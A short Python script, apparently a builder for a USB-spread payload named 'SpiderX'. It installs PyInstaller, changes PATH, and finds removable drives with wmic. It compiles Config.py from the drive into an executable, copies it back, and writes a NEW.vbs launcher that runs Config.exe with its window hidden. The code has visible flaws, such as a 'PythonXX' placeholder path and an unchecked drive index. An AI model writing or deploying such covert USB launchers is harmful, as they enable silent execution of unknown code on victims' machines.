import os
import subprocess
output = subprocess.check_output("echo %USERNAME%", shell=True)
name = output.decode('utf-8').strip()

def EnviromentSetup():
    # Install PyInstaller using pip
    subprocess.run("pip install pyinstaller", shell=True)

    # Get the username
   

    # Set the environment variable for PATH
    pyinstaller_path = fr"C:\Users\{name}\AppData\Local\Programs\Python\PythonXX\Scripts"
    subprocess.run(f'setx PATH "%PATH%;{pyinstaller_path}"', shell=True)

EnviromentSetup()


    

def get_removable_drives():
    cmd = 'wmic logicaldisk where drivetype=2 get deviceid /format:list'
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    removable_drives = []
    if result.returncode == 0:
        output_lines = result.stdout.strip().split('\n')
        for line in output_lines:
            if line.startswith("DeviceID="):
                drive_letter = line.split("=")[1]
                removable_drives.append(drive_letter)
    return removable_drives

removable_drives = get_removable_drives()

Convertcmd = f'pyinstaller --onefile {removable_drives[0]}//SpiderX//Config.py'
subprocess.run(Convertcmd, shell=True)


subprocess.run(f"copy C:\\Users\\{name}\\dist\\Config.exe {removable_drives[0]}\\SpiderX", shell=True)


Filename  = "NEW.vbs"
Filepath = f"{removable_drives[0]}//{Filename}"
print(Filepath)
 
content = '''Set objShell = CreateObject("WScript.Shell")
objShell.Run "\SpiderX\Config.exe", 0, False
Set objShell = Nothing
'''

with open(Filepath, "a") as F:
    F.writelines(content)
